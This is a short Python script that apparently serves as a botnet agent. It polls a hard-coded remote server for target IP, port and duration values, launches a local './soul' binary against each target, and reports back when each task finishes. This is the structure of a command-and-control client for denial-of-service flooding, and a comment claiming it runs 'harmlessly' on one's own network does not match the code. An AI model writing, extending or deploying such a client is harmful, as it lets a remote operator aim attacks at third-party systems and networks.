import requests
import subprocess
import time

BASE_URL = 'http://72.60.97.101:3001'
SOUL_PATH = '/LULEEBHAIBydaksh/'
DONE_PATH = '/LULEEBHAIBydaksh/done'

active_tasks = {}

def process_new_task(added):
    ip = added.get('ip')
    port = added.get('port')
    time_val = added.get('time')

    if ip and port and time_val:
        key = (ip, str(port), str(time_val))
        if key not in active_tasks:
            print(f"[+] New task: IP={ip}, Port={port}, Time={time_val}")
            try:
                # run harmlessly on your own machine/network
                process = subprocess.Popen(['./soul', str(ip), str(port), str(time_val)])
                print(f"[+] Started ./soul {ip} {port} {time_val} (PID {process.pid})")
            except Exception as e:
                print(f"[!] Launch failed: {e}")
            active_tasks[key] = int(time_val)
    else:
        print("[!] Missing ip/port/time")

def main_loop():
    while True:
        try:
            r = requests.get(f'{BASE_URL}{SOUL_PATH}')
            r.raise_for_status()
            data = r.json()

            if isinstance(data, dict) and data.get('success') and 'added' in data:
                process_new_task(data['added'])
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get('success') and 'added' in item:
                        process_new_task(item['added'])

            # countdown / cleanup
            to_remove = []
            for key in list(active_tasks.keys()):
                active_tasks[key] -= 1
                if active_tasks[key] <= 0:
                    ip, port, orig_time = key
                    print(f"[+] Finished: {ip}:{port} time={orig_time}")
                    try:
                        requests.get(f'{BASE_URL}{DONE_PATH}', params={'ip': ip, 'port': port, 'time': orig_time})
                    except Exception as e:
                        print(f"[!] Delete notify failed: {e}")
                    to_remove.append(key)
            for k in to_remove:
                active_tasks.pop(k, None)

            time.sleep(1)
        except Exception as e:
            print(f"[!] Loop error: {e}")
            time.sleep(1)

if __name__ == '__main__':
    main_loop()
